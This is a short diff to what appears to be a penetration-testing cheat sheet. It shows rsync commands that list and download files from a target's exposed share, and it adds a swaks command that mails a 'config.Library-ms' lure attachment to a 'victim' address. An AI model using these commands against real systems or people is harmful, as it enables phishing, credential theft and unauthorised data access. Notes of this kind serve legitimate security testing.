@@ -17,3 +17,8 @@ rsync --list-only $TARGET_IP::
 rsync --list-only $TARGET_IP::$DIR
 rsync $TARGET_IP::$DIR/$FILE $FILE
 ```
+
+Send email using SMTP server and swaks:
+```bash
+sudo swaks -t $VICTIM@$DOMAIN --from $USER@$DOMAIN -ap --attach config.Library-ms --server $SMTP_SERVER --body body.txt --header "Subject: Interesting" --suppress-data
+```
